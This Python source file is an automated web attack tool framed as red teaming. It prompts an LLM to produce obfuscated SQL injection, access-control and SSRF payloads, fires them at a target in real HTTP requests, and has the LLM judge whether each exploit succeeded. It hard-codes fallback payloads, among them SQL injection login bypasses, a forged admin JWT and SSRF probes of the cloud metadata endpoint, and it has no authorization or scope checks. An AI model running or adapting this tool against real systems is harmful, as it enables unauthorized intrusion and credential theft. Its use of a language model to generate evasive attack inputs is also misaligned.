import os
import json
import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from openai import OpenAI

# ---------- CONFIG ----------
GROQ_API_KEY = os.getenv("GROQ_API_KEY") or "your-groq-key"
SERPER_API_KEY = os.getenv("SERPER_API_KEY") or "your-serper-key"

_cache = {}
client = OpenAI(base_url="https://api.groq.com/openai/v1", api_key=GROQ_API_KEY)

# ---------- 1. DISCOVER INJECTION POINTS ----------
def discover_injection_points(target_url: str) -> list:
    """
    Probes the target to find potential injection points (GET parameters, forms).
    Returns a list of dicts: [{"method": "GET", "params": {"id": ""}, "url": "..."}, ...]
    """
    parsed = urlparse(target_url)
    query_params = parse_qs(parsed.query)
    injection_points = []

    # If there are query parameters, treat them as injection points
    if query_params:
        for key in query_params.keys():
            injection_points.append({
                "method": "GET",
                "param": key,
                "url": target_url,
                "data": None
            })
    else:
        # No query params – assume the target is a form endpoint (POST)
        injection_points.append({
            "method": "POST",
            "param": "username",  # Common injection point
            "url": target_url,
            "data": {"username": "", "password": ""}
        })

    return injection_points

# ---------- 2. AI GENERATES PAYLOADS ----------
def ai_generate_payloads(target_url: str, vuln_type: str, num_payloads: int = 5) -> list:
    cache_key = f"payloads_{target_url}_{vuln_type}"
    if cache_key in _cache:
        return _cache[cache_key]

    prompt = f"""
You are a world‑class penetration tester. Generate {num_payloads} realistic, high‑impact payloads for testing {vuln_type} on this target: {target_url}.

Rules:
- Return ONLY a JSON array of strings.
- Each payload must be unique and context‑aware.
- Include obfuscation techniques (encoding, comments, case variation).
- Do NOT include any explanation.

Example format: ["payload1", "payload2"]
"""
    try:
        response = client.chat.completions.create(
            model="llama-3.3-70b-versatile",
            messages=[
                {"role": "system", "content": "You are a security expert. Return only valid JSON."},
                {"role": "user", "content": prompt}
            ],
            temperature=0.7
        )
        raw = response.choices[0].message.content.strip()
        start = raw.find('[')
        end = raw.rfind(']') + 1
        if start != -1 and end != 0:
            payloads = json.loads(raw[start:end])
        else:
            payloads = [raw]
        _cache[cache_key] = payloads
        return payloads
    except Exception as e:
        print(f"[AI Payload Generation Error]: {e}")
        return get_fallback_payloads(vuln_type)

# ---------- 3. SEND PAYLOAD (REAL REQUEST) ----------
def send_payload(injection_point: dict, payload: str) -> dict:
    """
    Sends an actual HTTP request with the payload injected.
    Returns: {"status_code": int, "response_text": str, "error": None or str}
    """
    method = injection_point.get("method", "GET")
    url = injection_point["url"]
    param = injection_point.get("param")
    data = injection_point.get("data")

    try:
        if method.upper() == "GET" and param:
            # Inject into GET parameter
            parsed = urlparse(url)
            query_dict = parse_qs(parsed.query)
            query_dict[param] = payload
            new_query = urlencode(query_dict, doseq=True)
            new_url = urlunparse(parsed._replace(query=new_query))
            resp = requests.get(new_url, timeout=10, allow_redirects=False)
        elif method.upper() == "POST" and data:
            # Inject into POST form field (default: username)
            post_data = data.copy()
            # Find the first key to inject into (usually username)
            for key in post_data.keys():
                post_data[key] = payload
                break
            resp = requests.post(url, data=post_data, timeout=10, allow_redirects=False)
        else:
            # Fallback: generic GET with payload as ?q=
            resp = requests.get(f"{url}?q={payload}", timeout=10, allow_redirects=False)
        return {
            "status_code": resp.status_code,
            "response_text": resp.text[:2000],
            "error": None
        }
    except Exception as e:
        return {
            "status_code": 0,
            "response_text": "",
            "error": str(e)
        }

# ---------- 4. AI ANALYZES REAL RESPONSE ----------
def ai_analyze_response(response_text: str, payload: str, vuln_type: str, status_code: int) -> dict:
    prompt = f"""
You are a security analyst. Analyze this HTTP response to determine if the payload successfully exploited a {vuln_type} vulnerability.

Payload sent: {payload}
Status code: {status_code}

Response (truncated):
{response_text[:1500]}

Answer with JSON:
{{
    "success": true/false,
    "reason": "Brief explanation",
    "confidence": "high/medium/low"
}}
"""
    try:
        resp = client.chat.completions.create(
            model="llama-3.3-70b-versatile",
            messages=[
                {"role": "system", "content": "You are a security analyst. Return only valid JSON."},
                {"role": "user", "content": prompt}
            ],
            temperature=0.0
        )
        raw = resp.choices[0].message.content.strip()
        start = raw.find('{')
        end = raw.rfind('}') + 1
        if start != -1 and end != 0:
            result = json.loads(raw[start:end])
        else:
            result = {"success": False, "reason": "AI parsing failed", "confidence": "low"}
        return result
    except Exception as e:
        return {"success": False, "reason": f"AI error: {e}", "confidence": "low"}

# ---------- 5. AI SYNTHESIZES FINAL REPORT ----------
def ai_synthesize_report(target_url: str, vuln_type: str, results: list) -> str:
    prompt = f"""
You are a senior security consultant. Based on the following test results for {target_url} ({vuln_type}), generate a professional red team report.

Results:
{json.dumps(results, indent=2)}

Report must include:
1. Executive summary (1‑2 sentences)
2. Attack vector explanation
3. Successful payloads (with evidence)
4. Impact assessment
5. Remediation steps

Write in plain text, no markdown.
"""
    try:
        resp = client.chat.completions.create(
            model="llama-3.3-70b-versatile",
            messages=[
                {"role": "system", "content": "You are a senior security consultant. Write professional security reports."},
                {"role": "user", "content": prompt}
            ],
            temperature=0.3
        )
        return resp.choices[0].message.content.strip()
    except Exception as e:
        return f"Report generation failed: {e}"

# ---------- 6. FALLBACK PAYLOADS ----------
def get_fallback_payloads(vuln_type: str) -> list:
    fallbacks = {
        "SQL Injection": [
            "admin' OR '1'='1' --",
            "admin' UNION SELECT 1,2,3 --",
            "admin' OR 1=1 --",
            "admin' AND SLEEP(5) --"
        ],
        "Broken Access Control": [
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4ifQ",
            "/admin/dashboard"
        ],
        "SSRF": [
            "http://169.254.169.254/latest/meta-data/",
            "http://127.0.0.1:8080/admin"
        ]
    }
    return fallbacks.get(vuln_type, ["test"])

# ---------- 7. MAIN ORCHESTRATOR (RED TEAM) ----------
def generate_threat_analysis(target_url: str, vuln_type: str) -> str:
    """
    Full red team workflow:
    1. Discover injection points
    2. AI generates payloads
    3. Send real requests with each payload
    4. AI analyzes real responses
    5. AI synthesizes a professional report
    """
    # 1. Discover injection points
    injection_points = discover_injection_points(target_url)
    if not injection_points:
        return "Error: Could not identify any injection point. The target URL may be malformed."

    # 2. AI generates payloads
    payloads = ai_generate_payloads(target_url, vuln_type)

    # 3. For each injection point, test all payloads
    all_results = []
    for point in injection_points:
        for payload in payloads:
            # Send real request
            resp_data = send_payload(point, payload)
            if resp_data["error"]:
                analysis = {"success": False, "reason": f"Request error: {resp_data['error']}", "confidence": "low"}
            else:
                # AI analyzes real response
                analysis = ai_analyze_response(
                    resp_data["response_text"],
                    payload,
                    vuln_type,
                    resp_data["status_code"]
                )
            all_results.append({
                "injection_point": point,
                "payload": payload,
                "status_code": resp_data.get("status_code", 0),
                "response_snippet": resp_data.get("response_text", "")[:300],
                "analysis": analysis
            })

    # 4. AI synthesizes final report
    report = ai_synthesize_report(target_url, vuln_type, all_results)
    return report